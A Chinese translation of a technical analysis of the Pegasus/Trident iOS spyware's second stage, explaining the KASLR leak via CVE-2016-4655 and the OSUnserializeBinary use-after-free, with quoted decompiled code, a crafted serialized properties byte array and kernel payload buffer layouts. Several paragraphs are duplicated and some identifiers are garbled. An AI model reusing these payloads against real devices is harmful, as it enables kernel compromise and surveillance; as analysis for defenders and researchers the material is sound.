加载API想要阶段二成功，需要获得大量的API函数。为保证函数可用，阶段二通过dlsym动态加载需要的API地址。虽然动态读取API地址在恶意软件上很常见，但有趣的是制作者多次重复加载许多的API函数。仅在main函数上，加载了大量的API地址，但只使用一小部分的API（例如，socket函数加载到了内存中，却一直没有使用）。在加载了初期的API函数后，32位包调用了一个子进程（初始化），这个进程又会轮流调用其他几个子进程，每个进程负责加载其他的API函数，除此之外，执行不同的启动项任务。 分类加载API函数（哪个阶段二函数会加载哪个API函数），还有重复加载大量API，表明加载API是一些独立组件或者操作独有的。例如，一些函数负责解压越狱文件，利用chmod改变权限，将文件放在受害者iPhone上正确的地方。一个独立函数会加载执行这些操作的API函数。这个函数只会加载那些有用的API，而这些API不会和阶段二其他部分共享。 由于在整个二进制文件中大量使用调试日志，阶段二的分析也变得更加容易。对日志记录子系统的调用通常引用漏洞开发人员使用的原始文件名。这些调试代码的出现至少表明有以下独立模块（或子系统）存在： fs.c 加载跟文件还有文件系统操作方法例如ftw,open,read,rename,mount有关的API kaslr.c 加载API，如IORegistryEntryGetChildIterator,IORegistryEntryGetProperty,IOServiceGetMatchingService，通过利用io _ service _ open _ extended函数中的漏洞，这些API来找到内核地址。 bh.c 加载与下个阶段payloads相关的API，以及与放置文件正确位置相关的API，如 BZ2 _ bzDecompress, chmod, and malloc safari.c 加载如sync, exit, strcpyAPI，这些API用来清除Safari缓存文件以及终止进程。当攻击完成且完全退出后，这些清除工作才会开始，所以Safari崩溃清除（阶段一中说明的）就不会发生。 上述部分说明阶段二是基于模块化理念设计的，至少，由不同代码源文件组成。这些不同成分很可能在iOS攻击链中可重复使用。 环境设置和平台确定在初始化完成后，阶段二调用了一个全局回调函数，因错误阶段二终止时就会调用这个函数。根据写入器中的文件名，这个函数可能是一个断言样式回调。 为了确定受害者设备的型号，调用了sysctlbyname获得hw.machine。另一个对sysctlbyname获取kern.osversion 信息。完成这两项后，阶段二可以精确确定型号和iOS 内核版本。根据这两个信息，找到定义不同内存偏移量的数据库，阶段二依据这个库来爆破设备。如果阶段二找不到适合设备的数据库，进程会执行这个断言回调并退出。 阶段二在运行时使用一个锁定文件。作为运行环境设置的一部分，阶段二为这个文件创建文件名和全局目录变量–$HOME/tmp/lock（注意：$HOME是一个程序独有变量） 32位包支持100个手机型号和iOS版本组合项。同样，64位包支持99个手机型号和iOS版本组合项。 攻入KASLR阶段二的大部分功能是用来操纵内核以使受害设备防御系统失效。想要控制内核，必须先知道内核的位置。因为iOS使用的KASLR机制，通常情况下内核会映射到一随机地址。KASLR在用户每一次开机后将内核映射到一伪随机地址来阻止进程定位内存中内核地址。要找到内核，阶段二必须找到办法将内核空间的一个地址暴露到用户内存空间中。阶段二利用CVE-2016-4655找到内核空间中的一个内存地址。 阶段二首先在IOKit 子系统上开放了一个端口来找到内核。如果失败，调用断言回调并退出。阶段二创建了一个叫AppleKeyStore的服务并调用IOServiceMatching，调用结果返回到IOServiceGetMatchingService ，得到io _ service _ t对象，这个对象包含攻击者想要的已注册的IOKit IOService（即 AppleKeyStore）。有了这个IOService句柄，阶段二调用io_service_open_extended并将一段精心制作的属性字段传到服务中。这个字段是XML数据的串行化二进制表示，io_service_open_extended会将数据最终传到内核中的OSUnserializeBinary函数。OSUnserializeBinary里是一个转化语句，处理二进制XML数据结构中的不同种类的数据。kOSSerializeNumber类型的数据会随便接受一定长度的数据而没有任何的数据边界审核，最终会使调用者获得比允许的更多的内存空间。因为下面这段代码，这种情况得以发生。1234567891011len=(key &amp; kOSSerializeDataMask);...case kOSSerializeNumber: bufferPos += sizeof(long long); if(bufferPos&gt;bufferSize) break; value=next[1]; value&lt;&lt;=32; value |= next[0]; o = OSNumber::withNumber(value. len); next+=2; break; 问题是len变量在传送到OSNumber::withNumber前是无效的。最终，OSNumber::init被调用，其会盲目信任用户控制的值。12345678bool OSNumber::init(unsigned long long inValue, unsigned int newNumberofBits )&#123; if (!super::init()) return false; size=newNumberOfBits; value=(inValue &amp; sizeMask); return true;&#125; 这个漏洞让阶段二可以控制OSNumber的大小。io_service_open_extended为OSUnserializedBinary准备好了使用环境，通过OSUnserializedBinary来利用漏洞。在怎么利用前，先来看看传送到io_service_open_extended的恶意properties 字段。123456789101112131415161718192021222324252627282930unsigned char properties[]=&#123; //kOSSerializeBinarySignature 0xD3, 0x00,0x00,0x00, //kOSSerializeEndCollecton | kOSSerializeDictionary | 2 0x02,0x00,0x00,0x81, //KEY 1 specified as 30 bytes long (0x1E) //kOSSerializeSymbol | 0x1E 0x1E,0x00,0x00,0x08, \"HIDKeyboardModifierMappingSrc\", 0x00, //(30 bytes) //padding (30+3/4=8 DWORDS) 0x00,0x00, //VALUE 1 //kOSSerializeNumber specified as 0x800 bits (256 bytes) 0x00,0x08,0x00,0x04, //value of OSNumber(4) 0x04,0x00,0x00,0x00, 0x00,0x00,0x00,0x00, //KEY 2 specified as bytes long (0x1E) //kOSSerializeSymbol | 0x1E 0x1E,0x00,0x00,0x08, \"HIDKeyboardModifierMappingDst\",0x00, //(30 chars) //padding (30+3/4=8 DWORDS) 0x00,0x00, //VALUE 2 //kOSSerializeEndCollecton | kOSSerializeNumber | 32 0x20,0x00,0x00,0x84, //value of OSNumber(0x193) 0x93,0x01,0x00,0x00, 0x00,0x00,0x00,0x00&#125;; 阶段二调用IORegistryEntryGetProperty 来找到HIDKeyboardModifierMappingSrc的入口点，导致properties数组创建了超过最大值64bit的OSNumber值。阶段二用下列代码调用is_ io_registry_entry_get_property_bytes，这个函数会读取内核栈区的末尾值并将读到的数据备份到内核堆区中。接着IORegistryEntryGetProperty这个函数会将这段堆缓冲区返回到用户空间中。因此，栈头部指针会被用户读取，接着利用这个指针来计算iOS内核基址：1234567891011do&#123; ...&#125;while (IORegistryEntryGetProperty_0(v13, \"HIDKeyboardModifierMappingSrc\",dataBuffer,&amp;size));writeLog(7,\"%.2s%5.5d\\n\",\"kaslr.c\",127);if(size&gt;8)&#123; writeLog(7,\"%.2s%5.5d\\n\",\"kaslr.c\",138); return dataBuffer[index]&amp;0xFFF00000;&#125; 需要特别注意这段代码的两个方面。第一，properties数组指定OSNumber的值是256字节大小，这个值会最终导致数据泄露。第二，index值会因型号和iOS版本不同而不同，这个值存储在dataBuffer中，用来找到内存地址。阶段二的开发者已经规划了每个型号和iOS版本的组合项，确定dataBuffer那个地址值是有效的内核地址。 如果上述方法不足以找到内核基址或者发现iOS版本不是9，断言回调启动程序终止。 在受害设备上建立读/写/执行原语（32bit）找到内核基址后，阶段二的32包通过pipe函数生成一个IPC。如果pipe命令失败，就会停止攻击。生成IPC后，32包用一个内核端口得到时钟服务，通过host_get_clock_service得到电池时钟（著名的日历时钟）和实时时钟。如果任一时钟不可达，攻击就会停止。因为接下来用这三个对象（pipe set和两个时钟对象）获取内核读写执行权限，所以这三个对象非常重要。 紧跟着pipe和host_get_clock_service calls，32包检查向前通过task_from_pid创建的内核端口值。如果task_from_pid返回了一个有效值（不是NULL），32包用vm_write写入20字节的数据块，来修改内核空间。这个20字节数据覆盖了clock_ops的一部分。 当调用例如clock_get_attributes函数时，内核会调用电池时钟和实时时钟相关的函数，这个20字节数据就包含了这些函数的指针。数据块用现存的内核函数替代了两种时钟类型的getattr操作语。特别的是，实时时钟的getattr被修改成指向OSSerializer::serialize的指针，电池时钟的getattr改成指向_bufattr_cpx的指针。 当两个时钟调用clock_get_attributes时，会改变其原有的执行结果。例如电池时钟调用clock_get_attributes时，相当与调用了内核空间读函数。_bufattr_cpx只有两个属性：123_bufattr_cpx: LDR R0,[R0] BX LR R0里存储着一个内存地址，这是这个函数读取的，在返回调用函数前写入R0中。iPhone基于ARM框架的函数调用使用寄存器存储前四个函数参数，虽然getattr使用了三个参数，但缺少完全兼容的函数原型没有关系。 替代了实时时钟getattr的函数更加复杂。OSSerializer::serialize函数将OSSerializer 对象（包含虚函数表（vtable））作为this指针。函数调用 OSSerializer 对象0x10处的地址并通过BX命令来摆脱控制，向下一个函数传入DWORDs里8和12偏移处的值。1234567_DWORD OSSerializer::serialize(OSSerialize *): LDR R3,[R0,#8] MOV R2,R1 LDR R1,[R0,#0xC] LDR.W R12,[R0,#0x10] MOV R0,R3 BX R12 通过一段特殊设计的数据块，接下来会详细谈到，现在调用clock_get_attributes就可以在内核内执行任意函数。如果受害者的内核已经以某种方式暴露了，这种时钟修改才可能发生，这是值得注意的。所以，如果在一个没有越狱的手机上，修改可能不成功。 如果32包已经获得了内核端口并且完成了上述对不同时钟的修改，会略过接下来的几个步骤，获取访问权，逐步提升权限。如果因现阶段内核端口不可用，使内核修改失败，32包创建并锁向前初始化阶段的锁定文件。这个文件非常重要，因为后面获得内核改写权限会使用这个文件。 64位包不会利用已越狱手机上的后门。 线程操作为在内核中执行任意代码，最终阶段二会利用一个UFA（use after free）漏洞。当间接引用的内存区域（漏洞想要控制的）在漏洞利用开始前分配给了另一个线程，这时竞争状况产生了。其他线程可能突然申请一段重要的已释放区域，为降低这种可能性，阶段二会创建非常多的线程，并立刻将每个线程（主线程之外的）暂停。接着，阶段二为主线程修改时刻表策略，使利用UAF时不会碰到内存竞争占用的情况的可能性大大增加。 阶段二64位版本中还有额外的一个步骤。在线程时刻表修改完成后，阶段二会创建1000个线程。每个线程都含有一个单紧环，这个循环等待全局变量降至预定义值以下（值小于0）。这是为了确保（至少，增加可能性）没有其他的线程会争夺UFA目标内存块。 建立通信隧道（32位）阶段二32包利用pipe命令创建另一个pipe，重新使用原先生成的pipe的变量。在调用host_get_clock_service之后，这个命令立刻执行，以获得实时和电池时钟。因这个pipe，host_get_clock_service再使用了之前为获得不同时钟端口host_get_clock_service使用的变量。 先前生成的pipe和时钟端口非常关键，因为接下来的内核操作会用到，如果内核任务端口早已可得，32Stage2会略过这个对修改内核很重要的过程而是直接调用vm_write来修改内核。然而，如果32Stage2没有得到内核任务端口（手机没有越狱的情况），漏洞利用就很重要。作为攻击的一部分，32Stage2在攻击前向要获得pipe组和时钟，因此二进制包可以确保获得。尽管没必要重复，这是为确保重要的对象可达。 假定用于最终调用函数的触发机制只不过是将现有函数指针重定向到sysctl处理程序，64位包不用执行这一步骤。 payload构造和内核插入如果不能通过内核端口修改内核存储空间，32Stage2必须利用iOS已存漏洞去控制内核。其构造了两个数据缓冲块：包含修改实时和电池时钟的20字节的关键覆盖数据和38字节的一段payload，会运行一系列小程序来安装时钟覆盖程序。如下：clock_ops_overwrite 缓存区： [00] (rtclock.getattr):address of OSSerializer::serialize [04] (calend_config):NULL [08] (calend_init):NULL [0C] (calend_gettime):address of calen_gatattr [10] (calend_getattr):address of _bufattr_cpx uaf_payload_buffer攻击利用的缓存区： [00] ptr to clock_ops_overwrite buffer [04] address of clock_ops array in kern memory [08] address of _copyin [0C] NULL [10] address of OSSerializer::serialize [14] address of &quot;BX LR&quot; code fragment [18] NULL [1C] address of OSSymbol::getMetaClass [20] address of &quot;BX LR&quot; code fragment [24] address of &quot;BX LR&quot; code fragment 32Stage2创建一个新线程来处理安装一新的时钟处理程序所需要的初始操作，但这个新线程不会进行安装。这个线程在栈上创建kauth_filesec数据块： .fsec_magic=KAUTH_FILESEC_MAGIC; //0x12CC16D .fsec.owner=&lt;undetermind, random stack value&gt;; .fsec.group=&lt;undetermind, random stack value&gt;; .fsec_acl.entrycount=KAUTH_FILESEC_NOACL;//-1 uaf_payload_buffer添加到kauth _filesec中的kauth_filesec.fsec_acl.acl_ace[]数组末尾处。这个会在IOKit上开设一个端口，为AppleKeyStore调用IOServiceGetMatchingService。该线程利用与获取内核地址相同的方法，获得一段有效的内核内存空间。新线程和之前相同操作不同之处在于属性名称不同（新线程使用“ararararararararararararararararararararararararararararararararararararararararararararararararararararararararararararararara”）。 接着，open_extended 调用syscall。32包将锁定文件的地址传到syscall，还有KAUTH_UID_NONE和KAUTH_GID_NONE两个参数值，在线程开始时，创建kauth_filesec。open_extended会执行下列代码： if ((uap-&gt;xsecurity!=USER_ADD_NULL)&amp;&amp; ((ciferrror=kauth_copyinfilesec(uap-&gt;xsecurity,&amp;xsecdst))!=0)) kauth_copyinfilesec从用户块中复制kauth_filesec 到内核块中的kauth_filesec 数据块中。kauth_filesec 制作了一个访问控制列表(acl)包含访问控制入口(ace)。如下： /* FILE SECURITY information */ struct kauth_filesec{ u_int32_t fsec_magic; guid_t fsec_owner; guid_t fsec_group; struct kauth_acl fsec_acl; }； ACL储存在kauth_acl ，如下： /* Access Contro List */ struct kauth_acl{ u_int32_t acl_entrycount; u_int32_t acl_flags; struct kauth_ace acl_ace[1]; }; kauth_ace有24字节，如下： typedef u_int32_t kauth_ace_rights_t; /* Access Control List Entry (ACE) */ struct kauth_ace{ guid_t ace_applicable; u_int32_t ace_flags; kauth_ace_rights_t ace_rights; /*scope specific*/ }; kauth_acl里的acl_entrycount是一个无符号整型，定义了acl_ace数组里有多少个kauth_ace入口。如果ACL里没有ACE记录，acl_entrycount会定义为KAUTH_FILESEC_NOACL，这个值为-1。在kauth_copyinfilesec中发现如下注释。 /* 猜测filesec的大小。从基指针开始， 看看还有页面上还有多少空间剩余， 裁剪到合理的上界。如果空间不够， 重新基于实际ACL空间大小定义，重新开始。 上届值必须小于KAUTH_ACL_MAX_ENTRIES。 但可任意取值，0也可以。 */ 当该线程构建了kauth_filesec，会直接操控栈上的数据块地址，如下： //get stack address p=(unsigned int)&amp;stackAnchor &amp; 0xFFFFFF000; //kauth_filesec.fsec_magic (p+0xEC0)=0x12CC16D; //kauth_filesec.fsec_acl.entrycount=KAUTH_FILESEC_NOACL (p+0xEE4)=-1; //kauth_filesec.fsec_acl.acl_ace[...] memcpy(&amp;stackAnchor &amp; 0xFFFFF000 | 0xEEC, pExploit, 128); 堆栈在新线程执行开始时内容如下： char stackAnchor; //[sp+101Fh] [bp-2031h]@1 unsigned int size; //[sp+2020h] [bp-2013h]@12 char buffer[4096]; //[sp+2024h] [bp-102h]@12 int v26; //[sp+3024h] [bp-2Ch]@7 mach_port_t connection; //[sp+3028h] [hp-28h]@4 kern_return_t result; //[sp+320Ch] [bp-24h]@4 mach_port_t masterPort; //[sp+3030h] [bp-20h]@3 MAPDST 该新线程利用stackAnchor变量找到栈的一个页边界值。接着，线程创建一个非常大的数组，确保至少栈上的一页空间不会分配给函数关键变量，就可以创建一个kauth_filesec结构块，其包含了比必需的更多的信息。通过设置acl_entrycount去向系统说明没有ACE项，则当open_extended 加载kauth_filesec时，其不会解析acl _ flags 以外的任何数组。因此保护了攻击缓冲区的完整性，并防止因攻击缓冲区作为一真的ACE会被中断，内核可能因此产生错误。最终open_extended会将攻击缓冲区（以及clock _ ops _ overwrite 缓冲区）的内容复制到内核区域中。 新线程利用open_extended 的漏洞将未修改的payload放到了内核中。利用先前讨论的漏洞，即允许内核数据泄露进用户内存中，就可以找到payload的地址。当完成了对AppleKeyStore漏洞的攻击，buffer 变量传向io_service_open_extended （位于stackAnchor附近的相同变量）。这意味着AppleKeyStore 会返回指向内核块的指针，指针指向open_extended 复制进内核的代码块的后一项。因此，新线程的目的不是重写时钟处理程序指针，而是为这样的攻击做准备。 一旦新线程完成工作，包含了攻击缓冲区地址的变量会被检测，判断是否真是新线程设定的（在调用新线程前，该变量已被初始化为0x12345678）。如果没有获得内核地址，攻击便会停止。 在新线程活动完成后，若手机是iPhone4.1（iPhone4s），主线程会创建1000个线程。每个线程都生成一个小循环，循环等待一全局变量降为0以下（创建是默认值为1000）。并不清楚为什么对iPhone4s会有这种行为，这种行为的结果似乎对所有平台都有价值。主线程大量消耗内存资源，从而在UAF开发期间，减少了另一个线程将产生并因此争夺内存资源的概率。 payload结构和内核插入（64位）考虑到64Stage2中使用的触发机制的不同，设置和payload结构也有点不同的。64位没有创建管道和覆盖时钟getattr语句，而是重写了一sysctl 处理函数，最终也会导致 OSSerializer::serialize以32位相似方式执行。为建立执行原语，64位用到了net.inet.ip.dummynet.extract_heap的接口，64位可向其传送一精心制作的数据块，该数据块允许该二进制包重写指向连接内核区域的变量的指针。最终结果和getattr差不多，即允许64Stage2二进制文件执行来自用户空间的内核中的任意ROP链代码。 建立内核读/写基元（32位）利用现在内核内存中的漏洞利用代码，32Stage2必须激活代码才能安装新的clock_ops处理程序，该程序可使用户可以访问内核内存。32Stage2在io_service_open_extended反序列化例程中使用了free-after-free（UAF）漏洞。虽然报告先前展示了io_service_open_extended的反序列化功能会泄漏内核地址信息，但同一组件中的另一个漏洞也可会造成在内核中可执行任意代码。当io_service_open_extended传递属性数据blob时，该函数会在将信息传递给OSUnserializeXML之前将内容从用户空间复制到内核空间。 如果kOSSerializeBinarySignature值出现在数据blob的开头，OSUnserializeXML按顺序将信息传递给OSUnserializeBinary。OSUnserializeBinary存在这个漏洞。 properties参数中的数据blob表示一已序列化的XML字典（或容器）。为了重构关系，OSUnserializeBinary遍历整个blob数据来解析出各个数据对象。在编码过程中（将原始XML转换为其二进制表示的过程）可能会重复发现相同的对象。为了更有效地处理重复数据，将重复对象存储在数组（objsArray）中，重构的XML字典中的对象就可以由数组的索引来表示。 在OSUnserializeBinary中，while循环遍历blob中的每个已编码对象。循环首先确定对象的类型（例如，kOS Serialize Dictionary，kOS SerializeArray，kOSSerializeNumber，等等）及其大小。 len = (key &amp; kOSSerializeDataMask); ... switch ( kOSSerializeTypeMask &amp; key) { case kOSSerializeDictionary: o = newDict = OSDictionary::withCapacity(len); newCollect = (len!=0); break; case kOSSerializeArray: o = newArray =OSArray::withCapacity(len); newCollect = (len!=0); break; case kOSSerializeSet: o = newSet = OSSet::withCapacity(len); newCollect = (len!=0); case kOSSerializeObject; if(len&gt;=objsIdx) break; o = objsArray[len]; o-&gt;retain(); isRef = true; break; } 堆栈在新线程执行开始时内容如下： char stackAnchor; //[sp+101Fh] [bp-2031h]@1 unsigned int size; //[sp+2020h] [bp-2013h]@12 char buffer[4096]; //[sp+2024h] [bp-102h]@12 int v26; //[sp+3024h] [bp-2Ch]@7 mach_port_t connection; //[sp+3028h] [hp-28h]@4 kern_return_t result; //[sp+320Ch] [bp-24h]@4 mach_port_t masterPort; //[sp+3030h] [bp-20h]@3 MAPDST 该新线程利用stackAnchor变量找到栈的一个页边界值。接着，线程创建一个非常大的数组，确保至少栈上的一页空间不会分配给函数关键变量，就可以创建一个kauth_filesec结构块，其包含了比必需的更多的信息。通过设置acl_entrycount去向系统说明没有ACE项，则当open_extended 加载kauth_filesec时，其不会解析acl _ flags 以外的任何数组。因此保护了攻击缓冲区的完整性，并防止因攻击缓冲区作为一真的ACE会被中断，内核可能因此产生错误。最终open_extended会将攻击缓冲区（以及clock _ ops _ overwrite 缓冲区）的内容复制到内核区域中。 新线程利用open_extended 的漏洞将未修改的payload放到了内核中。利用先前讨论的漏洞，即允许内核数据泄露进用户内存中，就可以找到payload的地址。当完成了对AppleKeyStore漏洞的攻击，buffer 变量传向io_service_open_extended （位于stackAnchor附近的相同变量）。这意味着AppleKeyStore 会返回指向内核块的指针，指针指向open_extended 复制进内核的代码块的后一项。因此，新线程的目的不是重写时钟处理程序指针，而是为这样的攻击做准备。 一旦新线程完成工作，包含了攻击缓冲区地址的变量会被检测，判断是否真是新线程设定的（在调用新线程前，该变量已被初始化为0x12345678）。如果没有获得内核地址，攻击便会停止。 在新线程活动完成后，若手机是iPhone4.1（iPhone4s），主线程会创建1000个线程。每个线程都生成一个小循环，循环等待一全局变量降为0以下（创建是默认值为1000）。并不清楚为什么对iPhone4s会有这种行为，这种行为的结果似乎对所有平台都有价值。主线程大量消耗内存资源，从而在UAF开发期间，减少了另一个线程将产生并因此争夺内存资源的概率。 payload结构和内核插入（64位）考虑到64Stage2中使用的触发机制的不同，设置和payload结构也有点不同的。64位没有创建管道和覆盖时钟getattr语句，而是重写了一sysctl 处理函数，最终也会导致 OSSerializer::serialize以32位相似方式执行。为建立执行原语，64位用到了net.inet.ip.dummynet.extract_heap的接口，64位可向其传送一精心制作的数据块，该数据块允许该二进制包重写指向连接内核区域的变量的指针。最终结果和getattr差不多，即允许64Stage2二进制文件执行来自用户空间的内核中的任意ROP链代码。 建立内核读/写基元（32位）利用现在内核内存中的漏洞利用代码，32Stage2必须激活代码才能安装新的clock_ops处理程序，该程序可使用户可以访问内核内存。32Stage2在io_service_open_extended反序列化例程中使用了free-after-free（UAF）漏洞。虽然报告先前展示了io_service_open_extended的反序列化功能会泄漏内核地址信息，但同一组件中的另一个漏洞也可会造成在内核中可执行任意代码。当io_service_open_extended传递属性数据blob时，该函数会在将信息传递给OSUnserializeXML之前将内容从用户空间复制到内核空间。 如果kOSSerializeBinarySignature值出现在数据blob的开头，OSUnserializeXML按顺序将信息传递给OSUnserializeBinary。OSUnserializeBinary存在这个漏洞。 properties参数中的数据blob表示一已序列化的XML字典（或容器）。为了重构关系，OSUnserializeBinary遍历整个blob数据来解析出各个数据对象。在编码过程中（将原始XML转换为其二进制表示的过程）可能会重复发现相同的对象。为了更有效地处理重复数据，将重复对象存储在数组（objsArray）中，重构的XML字典中的对象就可以由数组的索引来表示。 在OSUnserializeBinary中，while循环遍历blob中的每个已编码对象。循环首先确定对象的类型（例如，kOS Serialize Dictionary，kOS SerializeArray，kOSSerializeNumber，等等）及其大小。 len = (key &amp; kOSSerializeDataMask); ... switch ( kOSSerializeTypeMask &amp; key) { case kOSSerializeDictionary: o = newDict = OSDictionary::withCapacity(len); newCollect = (len!=0); break; case kOSSerializeArray: o = newArray =OSArray::withCapacity(len); newCollect = (len!=0); break; case kOSSerializeSet: o = newSet = OSSet::withCapacity(len); newCollect = (len!=0); case kOSSerializeObject; if(len&gt;=objsIdx) break; o = objsArray[len]; o-&gt;retain(); isRef = true; break; } switch语句调度适当的指令来处理数据blob中找到的每种类型的对象。这些指令会生成新对象，并根据特定对象在反序列化过程中所需的内容设置与对象相关的标志。kOSSerializeObject对象类型是一种特殊情况，表示已经反序列化的对象，因此，将标志isRef设置为true，表示该对象是对objsArray数组中已有对象的引用。如果isRef值未设置为true，则刚刚进行反序列化的当前对象将通过setAtIndex添加到objsArray： switch语句调度适当的指令来处理数据blob中找到的每种类型的对象。这些指令会生成新对象，并根据特定对象在反序列化过程中所需的内容设置与对象相关的标志。kOSSerializeObject对象类型是一种特殊情况，表示已经反序列化的对象，因此，将标志isRef设置为true，表示该对象是对objsArray数组中已有对象的引用。如果isRef值未设置为true，则刚刚进行反序列化的当前对象将通过setAtIndex添加到objsArray： if (! isRef) { setAtIndex (objs, objsIdx, o); if ( !ok) break; objsIdx++; } setAtIndex是一个宏，将对象（o）添加到objsArray。虽然iOS环境中存在更强大的数组对象，例如OSArray（会自动处理引用计数的数组容器），但OSUnserializeBinary对其已反序列化的对象的数组对象管理采用手动多一些的管理方式。反序列化后，通过调用o-&gt; release（）来将对象的引用计数清零，在大多数情况下将导致对象被释放。可能会在kOSSerializeObject对象中抛出异常。 由于kOSSerializeObject对象是一个表示被其他条目引用的对象，因此必须在序列化后保留该对象。因此，在反序列化期间，kOSSerializeObject对象将调用o-&gt; retain（），从而增加对象的引用计数并防止从内存中删除它。 序列化数据blob允许多次使用相同的密钥。 换句话说，有可能（直到iOS 9.3.1，在CVE-2016-1828中修复了重复密钥问题）使XML代码如下： &lt;dict&gt; &lt;key&gt;KEY1&lt;/key&gt; &lt;number&gt;1&lt;/number&gt; &lt;key&gt;KEY1&lt;/key&gt; &lt;string&gt;2&lt;/string&gt; &lt;/dict&gt; 上面的XML一旦序列化，将包含五个对象。第一个对象是字典容器（&lt;dict&gt;表示kOSSerializeDictionary对象），后跟表示键的符号（“KEY1”赋给kOSSerializeSymbol）及其数据对象（整数1赋给kOSSerializeNumber）。第四个属性指定另一个密钥对象，会再次分配给KEY1，现在这个属性是一个包含字符串“2”的字符串对象（kOSSerializeString）。作为反序列化过程的一部分，KEY1的重用导致接下来的对象会替换分配给KEY1的原始值。用新数据替换密钥便是OSUnserializeBinary容易受到攻击的地方。 如前所述，当对象被反序列化时，只要该对象不是kOSSerializeObject，该对象就存储在objsArray中以供之后引用。此存储是setAtIndex宏的结果，如下： #define setAtIndex(v, idx, o) \\ if (idx &gt;= v##Capacity) \\ { \\ unint32_t ncap = v##Capacity+64; \\ typeof(v##Array)nbuf = (typeof (v##Array)) kalloc_container(ncap*sizeof(o)); \\ if (!nbuf) ok =false; \\ if(v##Array) \\ { \\ bcopy(v##Array, nbuf, v##Capacity * sizeof(o)); \\ kfree(v##Array,v##Capacity * sizeof(o)); \\ } \\ v##Array=nbuf; \\ v##Capacity=ncap; \\ } \\ if (ok) v##Array[idx]=o; 宏将扩展objsArray以容纳附加对象，并将对象分配到objsArray的末尾，而不通过o-&gt; retain（）调用增加其引用计数。此方法的问题在于，当第二个对象替换现有对象时（在我们的示例中，就是每当字符串对象替换KEY1的数字对象时），第一个对象被释放并随后被释放，但是指向现在释放的对象的指针存在于objsArray中。通常这只是一个糟糕的编程设计问题，但如果通过kOSSerializeObject条目引用该对象，则问题会变得更加复杂。如果kOSSerializeObject条目通过索引引用已释放对象的指针，则对o-&gt; retain（）的调用将尝试执行受攻击者控制的虚函数。 为了利用UAF漏洞，32Stage2必须控制已解除分配的内存位置，并放置一个自定义vtable，它将使retain条目指向自己选择的函数。安装自定义vtable需要访问两个已释放的相邻内存位置。由于在序列化过程中无法直接覆盖对象的vtable，通过分配然后释放两个内存位置，32Stage2可以使用OSData或OSString对象一次替换两个内存位置，其中一个内存位置包含恶意vtable。导致UAF漏洞的上述条件是CVE-2016-18284的结果，并且存在于9.0到9.3.1的iOS版本中。32Stage2通过使用以下payload来利用此漏洞，以便在iOS时钟处理程序中安装内核读/写原语。 [0x00] kOSSerailizeBinarySignature [0x04] kOSSerailizeEndCollecton | kOSSerailizeDictionary | 0x10 [0x08] kOSSerailizeString | 4 [0x0C] &quot;sy2&quot; [0x10] kOSSerailizeEndCollecton | kOSSerailizeArray | 0x10 [0x14] kOSSerailizeDictionary | 0x10 [0x18] kOSSerailizeSymbol | 4 [0x1C] &quot;sy1&quot; [0x20] kOSSerailizeData | 0x14 [0x24] &quot;ffff\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0&quot; [0x38] kOSSerailizeSymbol | 4 [0x3C] &quot;sy1&quot; [0x40] kOSSerailizeEndCollecton | kOSSerailizeSymbol | 4 [0x44] &quot;sy1&quot; [0x48] kOSSerailizeString | 0x1C [0x4C] {payload buffer} [0x68] kOSSerailizeString | 0x1C [0x6C] {payload buffer} [0x88] kOSSerailizeString | 0x1C [0x8C] {payload buffer} [0xA8] kOSSerailizeEndCollecton | kOSSerailizeObject | 5 在payload中，32Stage2重用sy1密钥以通过UAF漏洞激活payload。 从iOS版本9.3.2开始，修补了CVE-2016-1828漏洞，这迫使需要一种不同的机制来安装内核读/写原语。但是，OSUnserializeBinary的kOSSerializeObject仍包含UAF漏洞。 理解这个概念的最简单方法是查看32Stage2生成的payload，以利用OSUnserializeBinary UAF漏洞。 对于iOS版本9.3.2至少9.3.3，payload采用以下形式： [0x00] kOSSerailizeBinarySignature [0x04] kOSSerailizeEndCollecton | kOSSerailizeDictionary | 0x10 [0x08] kOSSerializeString | 4 [0x0C] &quot;sy2&quot; [0x10] kOSSerializeData | 0x14 [0x14] {payload buffer} [0x28] kOSSerializeEndCollecton | kOSSerializeObject | 1 虽然在结构上它们看起来有些不同，但最终它们都利用了UAF漏洞。在iOS 9.3.2及更高版本中使用的这种更简单的payload是最容易理解的。当OSUnserializeBinary开始反序列化payload的解析过程时，该函数将创建一个新的字典对象，偏移0x04处的运行结果。在词典中有两个无键对象。第一个对象是一个OSString对象，其值为sy2（分别在偏移量0x08和0x0C中指定）。在偏移量0x10处指定大小为0x14（20）字节的OSData对象。OSData对象包含payload缓冲区数据结构。由于对象是无键的，OSUnserializeBinary将用OSData对象替换OSString对象，但将指针留在objsArray中。由于OSString对象没有retain（）调用，OSString被释放，从而将两个内存数组放入空闲列表中（一个用于OSString对象本身，另一个用于与OSString对象关联的字符串）。 当OSUnserializeBinary解析kOSSerializeData时，将分配新的OSData对象，从而从空闲列表中消耗一个已释放的内存位置。当与kOSSerializeData关联的数据被复制到OSData对象中时，将为数据分配新的缓冲区，该缓冲区将消耗空闲列表中的剩余数据位置。此时，objsArray中的悬空指针已被OSData对象的数据替换。它是与OSData对象关联的数据，其中包含恶意payload，最终将给予32Stage2写访问内核权限，以便安装读/写原语。 无论iOS版本如何，恶意payload都包含相同的payload缓冲区。payload缓冲区是一个20字节的结构，由以下元素组成： [00] address of uaf_payload_buffer + 8 [04] {uninitialized data from stack} [08] address of uaf_payload_buffer [0C] static value of 20 [10] address of OSSerializer::serialize payload必须包含指向偏移量0x10处新保留函数的指针。32Stage2使用OSSerializer :: serialize函数作为替换保留。这种设计意味着payload的其余部分必须模拟OSSerializer对象的vtable。如先前在已植入的设备上建立读/写/执行原语所述，OSSerializer :: serialize函数将在所提供的vtable的偏移0x10处调用该函数，同时将vtable的偏移0x08和0x0C传递给被调用的函数。假设偏移量0x10设置为OSSerializer :: serialize，则会再次调用该函数，但第二次将调用偏移量0x08指定的vtable。此调用会导致一系列后续调用，最终导致调用 _copyin，这个函数替换实时和电池时钟的getattr处理程序，正如在之前植入的设备上建立读/写/执行原语步骤中所述。 在执行漏洞利用之后，如果受害者的手机是“iPhone4,1”，则控制之前生成的1000个线程的全局变量值将设置为-1以终止线程。 为验证电池时钟的getattr处理程序是否成功读取内核内存地址，将调用clock_get _attributes，并将读取位置指定为内核的基址。如果clock_get _attributes的结果不是魔术值0xFEEDFACE，则再次尝试。 第二次失败导致调用assert回调并终止32Stage2。 建立内核读/写基元（64位）在第二阶段的64位版本中利用了相同的底层漏洞。原则上，漏洞利用的结构非常类似。主要区别在于通过写入net.inet.ip.dummynet.extract _ heap sysctl处理程序来建立最终的执行原语。OSSerializer :: 